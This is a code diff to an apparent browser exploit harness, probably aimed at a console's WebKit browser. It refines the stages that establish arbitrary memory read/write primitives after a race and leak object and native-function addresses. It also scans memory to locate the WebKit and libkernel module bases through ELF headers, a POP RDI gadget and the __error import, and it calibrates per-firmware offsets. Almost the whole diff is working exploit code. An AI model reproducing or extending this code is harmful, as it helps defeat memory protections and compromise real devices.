@@ -11,9 +11,13 @@ let failCount = 0;
 let busy = false;
 let primitiveDone = false;
 let exploit = null;
+let calibratedOff = null;
 
-const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP/i;
 const CORE_LOG = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP|ATTEMPT|SSV-|AUTO-RETRY|CORE-GIVE|COMPOSITION|PRIMITIVE/i;
+const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP/i;
+
+const SCAN_MAX_DELTA = 0x03000000;
+const SCAN_YIELD_EVERY = 16;
 
 function mark(tag, detail) {
     if (!outEl) return;
@@ -46,6 +50,15 @@ function resolvedOffKey() {
     return pick;
 }
 
+function effectiveOff() {
+    const offKey = resolvedOffKey();
+    const { off } = offsetsForKey(offKey);
+    if (!off) return null;
+    if (calibratedOff)
+        return Object.assign({}, off, calibratedOff);
+    return off;
+}
+
 function crossFw(offKey) {
     const detected = offsetsFor(navigator.userAgent);
     return detected.key && detected.key !== offKey;
@@ -60,6 +73,12 @@ function setUi() {
     btnAll.disabled = busy || primitiveDone;
     btnClear.disabled = busy;
     fwSelect.disabled = busy || primitiveDone;
+    if (attemptsSelect) attemptsSelect.disabled = busy || primitiveDone;
+}
+
+async function breathe(i) {
+    if (i > 0 && (i % SCAN_YIELD_EVERY) === 0)
+        await new Promise(r => setTimeout(r, 0));
 }
 
 async function withBusy(fn) {
@@ -103,8 +122,12 @@ function same64(a, b) {
     return a.low === b.low && a.hi === b.hi;
 }
 
-function alignedModuleBase(v) {
+function alignedWebkitBase(v) {
     return v.hi > 0 && (v.low & 0x3fff) === 0;
+}
+
+function plausibleLibkernelBase(v) {
+    return v.hi > 0 && v.low !== 0;
 }
 
 function plausibleUserPtr(v) {
@@ -134,50 +157,21 @@ function safeRead4(p, addr) {
     }
 }
 
-function resolveNativeFn(p, mFunctionOff) {
+function nativeExpm1Quiet(p, mFunctionOff) {
     const cell = p.leakval(Math.expm1);
-    mark("CAL-CELL", String(cell));
-
-    const tryPath = (label, ptr) => {
-        if (!plausibleUserPtr(ptr)) return null;
-        return { ptr, label };
-    };
-
-    const paths = [];
     const mid = safeRead8(p, cell.add32(0x18));
-    if (mid) {
-        const nat = safeRead8(p, mid.add32(mFunctionOff));
-        const hit = tryPath("cell+0x18 -> +" + mFunctionOff.toString(16), nat);
-        if (hit) paths.push(hit);
-    }
-    for (let o = 0x8; o <= 0x30; o += 8) {
-        const q = safeRead8(p, cell.add32(o));
-        const hit = tryPath("cell+0x" + o.toString(16), q);
-        if (hit) paths.push(hit);
-    }
-
-    if (paths.length === 0) return null;
-    mark("CAL-NATIVEFN-PATH", paths[0].label);
-    return paths[0].ptr;
+    if (!mid) return null;
+    return safeRead8(p, mid.add32(mFunctionOff));
 }
 
-function nativeExpm1(p, mFunctionOff, quiet) {
-    if (quiet) {
-        const cell = p.leakval(Math.expm1);
-        const mid = safeRead8(p, cell.add32(0x18));
-        if (!mid) return null;
-        return safeRead8(p, mid.add32(mFunctionOff));
-    }
-    return resolveNativeFn(p, mFunctionOff);
-}
-
-function findWebkitBaseElf(p, nativeFn) {
+async function findWebkitBaseElf(p, nativeFn) {
     if (!plausibleUserPtr(nativeFn)) return null;
-    // Module bases are 0x4000-aligned but expm1 RVA is not — start at nativeFn.low % 0x4000
     let delta = nativeFn.low & 0x3fff;
-    for (; delta < 0x05000000; delta += 0x4000) {
+    let steps = 0;
+    for (; delta < SCAN_MAX_DELTA; delta += 0x4000) {
+        await breathe(steps++);
         const base = nativeFn.sub32(delta);
-        if (!alignedModuleBase(base)) continue;
+        if (!alignedWebkitBase(base)) continue;
         const magic = safeRead4(p, base);
         if (magic === 0x464c457f)
             return { base, wk_expm1_builtin: delta, via: "elf" };
@@ -185,30 +179,92 @@ function findWebkitBaseElf(p, nativeFn) {
     return null;
 }
 
-function findWebkitBaseGadget(p, nativeFn, gadgetRva, expectLo16) {
+async function findWebkitBaseGadget(p, nativeFn, gadgetRva) {
     if (!plausibleUserPtr(nativeFn) || !gadgetRva) return null;
     let delta = nativeFn.low & 0x3fff;
-    for (; delta < 0x05000000; delta += 0x4000) {
+    let steps = 0;
+    for (; delta < SCAN_MAX_DELTA; delta += 0x4000) {
+        await breathe(steps++);
         const base = nativeFn.sub32(delta);
-        if (!alignedModuleBase(base)) continue;
+        if (!alignedWebkitBase(base)) continue;
         const g = safeRead4(p, base.add32(gadgetRva));
-        if (g == null) continue;
-        if ((g & 0xffff) === expectLo16)
+        if (g != null && (g & 0xffff) === 0xc35f)
             return { base, wk_expm1_builtin: delta, via: "gadget" };
     }
     return null;
 }
 
-function findWebkitBase(p, nativeFn, off) {
-    const elf = findWebkitBaseElf(p, nativeFn);
+async function findWebkitBase(p, nativeFn, off) {
+    const elf = await findWebkitBaseElf(p, nativeFn);
     if (elf) return elf;
     const gadgetRva = off && off.wk_POP_RDI_RET;
     if (gadgetRva) {
-        mark("CAL-SCAN", "ELF miss — trying POP_RDI at 0x" + gadgetRva.toString(16));
-        const g = findWebkitBaseGadget(p, nativeFn, gadgetRva, 0xc35f);
-        if (g) return g;
+        mark("CAL-SCAN", "ELF miss — POP_RDI @ 0x" + gadgetRva.toString(16));
+        return findWebkitBaseGadget(p, nativeFn, gadgetRva);
     }
     return null;
+}
+
+async function findErrorImport(p, webkitBase, hintRva) {
+    if (!plausibleUserPtr(webkitBase) || !hintRva) return null;
+    const hi = webkitBase.hi;
+    const start = Math.max(0, hintRva - 0x80000);
+    const end = hintRva + 0x80000;
+    let steps = 0;
+    for (let rva = start; rva < end; rva += 0x10) {
+        await breathe(steps++);
+        const ptr = safeRead8(p, webkitBase.add32(rva));
+        if (!ptr || ptr.hi <= hi || ptr.hi > hi + 4) continue;
+        for (const kErr of [0x26420, 0xd9d0, 0x3370]) {
+            const lk = ptr.sub32(kErr);
+            if (!plausibleLibkernelBase(lk)) continue;
+            const w0 = safeRead4(p, lk);
+            const w1 = safeRead4(p, lk.add32(4));
+            if (w0 == null || w1 == null) continue;
+            if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
+                return { wk___imp___error: rva, k__error: kErr, libkernelBase: lk };
+        }
+    }
+    return null;
+}
+
+function computeBases(p, off) {
+    if (!off || !off.wk_expm1_builtin) return null;
+    const nativeFn = nativeExpm1Quiet(p, off.wk_JSFunction_m_function || 0x28);
+    if (!nativeFn) return { error: "nativeFn unreadable" };
+    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+    if (!off.wk___imp___error || !off.k__error)
+        return { nativeFn, webkitBase, libkernelBase: null };
+    const errorFn = safeRead8(p, webkitBase.add32(off.wk___imp___error));
+    if (!errorFn)
+        return { nativeFn, webkitBase, libkernelBase: null, error: "error import unreadable" };
+    const libkernelBase = errorFn.sub32(off.k__error);
+    return { nativeFn, webkitBase, libkernelBase, errorFn };
+}
+
+function verifyBases(p, off, checkOffset) {
+    const b = computeBases(p, off);
+    if (!b) {
+        checkOffset("module-bases", false, "no offset table");
+        return false;
+    }
+    if (b.error && !b.libkernelBase) {
+        mark("BASES", "webkit=" + b.webkitBase + " nativeFn=" + b.nativeFn
+            + " (" + b.error + ")");
+        checkOffset("module-bases-webkit-aligned", alignedWebkitBase(b.webkitBase), "");
+        checkOffset("module-bases-libkernel", false, b.error);
+        return false;
+    }
+    mark("BASES", "webkit=" + b.webkitBase + " libkernel=" + b.libkernelBase
+        + " nativeFn=" + b.nativeFn);
+    const wkOk = alignedWebkitBase(b.webkitBase);
+    const lkOk = b.libkernelBase
+        ? (alignedWebkitBase(b.libkernelBase) || plausibleLibkernelBase(b.libkernelBase))
+        : false;
+    checkOffset("module-bases-webkit-aligned", wkOk, "");
+    if (b.libkernelBase)
+        checkOffset("module-bases-libkernel-plausible", lkOk, "");
+    return wkOk && lkOk;
 }
 
 function bufAddr(p, off, ab) {
@@ -218,100 +274,62 @@ function bufAddr(p, off, ab) {
     return safeRead8(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
 }
 
-function findArrayBufferBacking(p, ab, expectLo) {
-    const cell = p.leakval(ab);
-    const implOffs = [0x8, 0x10, 0x18];
-    const seen = new Set();
-    const tryPtr = (label, ptr) => {
-        if (!ptr) return null;
-        const key = ptr.low + ":" + ptr.hi;
-        if (seen.has(key)) return null;
-        seen.add(key);
-        const val = safeRead4(p, ptr);
-        if (val === expectLo) return { label, ptr };
-        return null;
-    };
-
-    for (let o = 0; o <= 0x40; o += 8) {
-        const hit = tryPtr("cell+0x" + o.toString(16), safeRead8(p, cell.add32(o)));
-        if (hit) return hit;
-    }
-    for (const implOff of implOffs) {
-        const impl = safeRead8(p, cell.add32(implOff));
-        if (!impl) continue;
-        for (let o = 0; o <= 0x40; o += 8) {
-            const hit = tryPtr("impl@cell+0x" + implOff.toString(16) + "+0x"
-                + o.toString(16), safeRead8(p, impl.add32(o)));
-            if (hit) return hit;
-        }
-    }
-    return null;
-}
-
-function findErrorImport(p, webkitBase, hintRva) {
-    if (!plausibleUserPtr(webkitBase)) return null;
-    const hi = webkitBase.hi;
-    const windows = hintRva
-        ? [[Math.max(0, hintRva - 0x200000), hintRva + 0x200000]]
-        : [[0x3800000, 0x3d00000], [0, 0x0200000]];
-    for (const [start, end] of windows) {
-        for (let rva = start; rva < end; rva += 8) {
-            const ptr = safeRead8(p, webkitBase.add32(rva));
-            if (!ptr || ptr.hi <= hi || ptr.hi > hi + 4) continue;
-            for (const kErr of [0x26420, 0xd9d0, 0x3370]) {
-                const lk = ptr.sub32(kErr);
-                if (!alignedModuleBase(lk)) continue;
-                const w0 = safeRead4(p, lk);
-                const w1 = safeRead4(p, lk.add32(4));
-                if (w0 == null || w1 == null) continue;
-                if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
-                    return { wk___imp___error: rva, k__error: kErr, libkernelBase: lk };
-            }
-        }
-    }
-    return null;
-}
-
-function calibrateOffsets(p, off) {
-    mark("CALIBRATE", "scanning live module layout");
-    const mFunctionOff = off.wk_JSFunction_m_function || 0x28;
-    const nativeFn = nativeExpm1(p, mFunctionOff);
+async function calibrateOffsets(p, tableOff) {
+    mark("CALIBRATE", "light scan (yields to avoid OOM)");
+    const mFunctionOff = tableOff.wk_JSFunction_m_function || 0x28;
+    const nativeFn = nativeExpm1Quiet(p, mFunctionOff);
     if (!nativeFn) {
         mark("CALIBRATE-FAIL", "Math.expm1 native pointer unreadable");
         return null;
     }
     mark("CAL-NATIVEFN", String(nativeFn));
 
-    const wk = findWebkitBase(p, nativeFn, off);
+    const wk = await findWebkitBase(p, nativeFn, tableOff);
     if (!wk) {
-        mark("CALIBRATE-FAIL", "webkit base not found (ELF + gadget scan)");
+        mark("CALIBRATE-FAIL", "webkit base not found (ELF + gadget)");
         return null;
     }
-    mark("CAL-VIA", wk.via || "elf");
+    mark("CAL-VIA", wk.via);
     mark("CAL-WK-BASE", String(wk.base));
     mark("CAL-wk_expm1_builtin", "0x" + wk.wk_expm1_builtin.toString(16));
 
-    const err = findErrorImport(p, wk.base, off.wk___imp___error);
+    mark("CALIBRATE", "scanning __imp___error (narrow window)...");
+    const err = await findErrorImport(p, wk.base, tableOff.wk___imp___error);
     if (err) {
         mark("CAL-wk___imp___error", "0x" + err.wk___imp___error.toString(16));
         mark("CAL-k__error", "0x" + err.k__error.toString(16));
         mark("CAL-LK-BASE", String(err.libkernelBase));
     } else {
-        mark("CALIBRATE-WARN", "__imp___error not found");
+        mark("CALIBRATE-WARN", "__imp___error not found — webkit base still valid");
     }
 
-    return Object.assign({
+    const live = Object.assign({
+        fw_status: "calibrated on hardware",
         wk_JSFunction_m_function: mFunctionOff,
-        wk_ArrayBuffer_m_impl: off.wk_ArrayBuffer_m_impl,
-        wk_ArrayBuffer_m_contents_m_data: off.wk_ArrayBuffer_m_contents_m_data,
-    }, { wk_expm1_builtin: wk.wk_expm1_builtin }, err || {});
+        wk_expm1_builtin: wk.wk_expm1_builtin,
+        wk_ArrayBuffer_m_impl: tableOff.wk_ArrayBuffer_m_impl,
+        wk_ArrayBuffer_m_contents_m_data: tableOff.wk_ArrayBuffer_m_contents_m_data,
+    }, err || {});
+
+    calibratedOff = live;
+    mark("CALIBRATE-STORED", "step 2 will use calibrated wk_*");
+
+    mark("CALIBRATE", "verify with live offsets...");
+    let offsetFail = 0;
+    const checkOffset = (name, ok, detail) => {
+        if (ok) passCount++; else { failCount++; offsetFail++; }
+        mark(ok ? "PASS" : "FAIL", name + (detail ? "  " + detail : ""));
+    };
+    verifyBases(p, live, checkOffset);
+
+    return live;
 }
 
 function logBootInfo() {
     const detected = offsetsFor(navigator.userAgent);
     mark("UA", navigator.userAgent);
     mark("UA-FW", detected.key || "unknown");
-    mark("BOOT", "UI OK — exploit loads on step 1 only");
+    mark("BOOT", "order: 1 primitive -> 3 calibrate -> 2 verify (step 2 is lite)");
     if (params.has("g"))
         mark("BOOT", "groom override: " + params.getAll("g").join(", "));
 }
@@ -345,8 +363,7 @@ async function runEstablish() {
         });
     } catch (err) {
         if (/gave up/i.test(String(err.message))) {
-            mark("HINT", "race lost — close browser fully, reopen, tries=3 or low-mem");
-            mark("HINT", "OOM with 6 tries? use 1 try + low-mem reload");
+            mark("HINT", "race lost — close browser, reopen, tries=3");
         }
         throw err;
     }
@@ -360,8 +377,8 @@ async function runEstablish() {
     if (!p) throw new Error("window.p was not installed");
 
     primitiveDone = true;
-    mark("PAIR-STATUS", "state=" + pairStatus.state
-        + " promoted=" + pairStatus.promoted);
+    calibratedOff = null;
+    mark("PAIR-STATUS", "state=" + pairStatus.state + " promoted=" + pairStatus.promoted);
     mark("PRIMITIVE-OK", "window.p read/write/leakval live");
 
     const boxA = { tag: "A" };
@@ -376,8 +393,8 @@ async function runEstablish() {
     p.write8(addrA, headerA);
     check("read8-write8-roundtrip-header", same64(p.read8(addrA), headerA), "");
 
-    state("primitive OK — run step 2 or 3", "ok");
-    mark("READY", "offset tests and calibrate unlocked");
+    state("primitive OK — run step 3 next", "ok");
+    mark("READY", "calibrate before offset tests (step 2 is heavy if skipped)");
 }
 
 async function runOffsetTests() {
@@ -385,21 +402,17 @@ async function runOffsetTests() {
     if (!p) throw new Error("run step 1 first");
 
     const offKey = resolvedOffKey();
-    const { off } = offsetsForKey(offKey);
+    const off = effectiveOff();
     if (!off) throw new Error("no offset table for fw=" + offKey);
 
-    mark("STEP", "2 · offset tests");
+    mark("STEP", "2 - offset tests (lite)");
     mark("OFFSETS-FW", offKey);
-    mark("OFFSETS", off.fw_status || "loaded");
-    if (crossFw(offKey))
-        mark("NOTE", "UA FW != offset table — fails here are expected");
+    mark("OFFSETS-SRC", calibratedOff ? "calibrated" : "table (run step 3 first for BASES)");
+    if (crossFw(offKey) && !calibratedOff)
+        mark("NOTE", "table RVAs may not match UA firmware");
 
     state("offset tests...", "warn");
-
-    const probe = new ArrayBuffer(0x20);
-    const view = new Uint32Array(probe);
-    view[0] = 0xdeadbeef;
-    view[1] = 0xcafebabe;
+    await new Promise(r => setTimeout(r, 0));
 
     let offsetFail = 0;
     const checkOffset = (name, ok, detail) => {
@@ -409,50 +422,33 @@ async function runOffsetTests() {
         } else {
             failCount++;
             offsetFail++;
-            mark(crossFw(offKey) ? "FAIL-OFFSET" : "FAIL", name + (detail ? "  " + detail : ""));
+            mark("FAIL", name + (detail ? "  " + detail : ""));
         }
         return ok;
     };
 
-    const backing = findArrayBufferBacking(p, probe, 0xdeadbeef);
-    if (backing)
-        mark("AB-BACKING", backing.label + " -> " + backing.ptr);
+    const probe = new ArrayBuffer(0x20);
+    const view = new Uint32Array(probe);
+    view[0] = 0xdeadbeef;
 
-    const dataPtr = backing ? backing.ptr : bufAddr(p, off, probe);
+    const dataPtr = bufAddr(p, off, probe);
     if (!dataPtr) {
-        checkOffset("arraybuffer-data-plausible", false, "no backing ptr found");
+        checkOffset("arraybuffer-backing", false, "bufAddr failed — impl chain wrong");
     } else {
-        checkOffset("arraybuffer-data-plausible", dataPtr.hi > 0, "ptr=" + dataPtr);
         const got = safeRead4(p, dataPtr);
         checkOffset("arraybuffer-read4",
             got === 0xdeadbeef,
-            "got=" + (got == null ? "null" : "0x" + got.toString(16)) + " ptr=" + dataPtr);
+            "got=" + (got == null ? "null" : "0x" + got.toString(16)));
         if (got === 0xdeadbeef) {
             p.write4(dataPtr, new int64(0x13371337, 0));
-            checkOffset("arraybuffer-write4",
-                view[0] === 0x13371337,
-                "view[0]=" + view[0].toString(16));
+            checkOffset("arraybuffer-write4", view[0] === 0x13371337, "");
         }
     }
 
-    if (off.wk_expm1_builtin) {
-        const nativeFn = nativeExpm1(p, off.wk_JSFunction_m_function, true);
-        if (!nativeFn) {
-            checkOffset("module-bases-0x4000-aligned", false, "nativeFn unreadable");
-        } else {
-            const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
-            const errorFn = safeRead8(p, webkitBase.add32(off.wk___imp___error));
-            if (!errorFn) {
-                checkOffset("module-bases-0x4000-aligned", false,
-                    "webkit=" + webkitBase + " error import unreadable");
-            } else {
-                const libkernelBase = errorFn.sub32(off.k__error);
-                mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
-                    + " nativeFn=" + nativeFn);
-                checkOffset("module-bases-0x4000-aligned",
-                    alignedModuleBase(webkitBase) && alignedModuleBase(libkernelBase), "");
-            }
-        }
+    if (!calibratedOff) {
+        mark("SKIP-BASES", "run step 3 calibrate first for module base checks");
+    } else {
+        verifyBases(p, off, checkOffset);
     }
 
     const summary = passCount + " pass, " + failCount + " fail";
@@ -468,24 +464,15 @@ async function runCalibrate() {
     const { off } = offsetsForKey(offKey);
     if (!off) throw new Error("no offset table for fw=" + offKey);
 
-    mark("STEP", "3 · calibrate wk_*");
-    mark("OFFSETS-FW", offKey + " (hint for __imp___error scan)");
+    mark("STEP", "3 - calibrate wk_*");
     state("calibrating...", "warn");
 
-    const live = calibrateOffsets(p, off);
+    const live = await calibrateOffsets(p, off);
     if (live && live.wk_expm1_builtin != null) {
-        mark("PASTE-OFFSETS", JSON.stringify({
-            fw_status: "calibrated on hardware",
-            wk_expm1_builtin: live.wk_expm1_builtin,
-            wk_JSFunction_m_function: live.wk_JSFunction_m_function,
-            wk___imp___error: live.wk___imp___error,
-            k__error: live.k__error,
-            wk_ArrayBuffer_m_impl: live.wk_ArrayBuffer_m_impl,
-            wk_ArrayBuffer_m_contents_m_data: live.wk_ArrayBuffer_m_contents_m_data,
-        }, null, 0));
+        mark("PASTE-OFFSETS", JSON.stringify(live, null, 0));
     }
 
-    state("calibrate done", "ok");
+    state("calibrate done — run step 2", "ok");
     mark("DONE-CALIBRATE", "");
 }
 
@@ -525,7 +512,8 @@ function init() {
     wireButton(btnCalibrate, runCalibrate);
     wireButton(btnAll, async () => {
         await runEstablish();
-        await runOffsetTests();
+        await new Promise(r => setTimeout(r, 100));
+        await runCalibrate();
     });
 
     btnClear.addEventListener("click", () => {
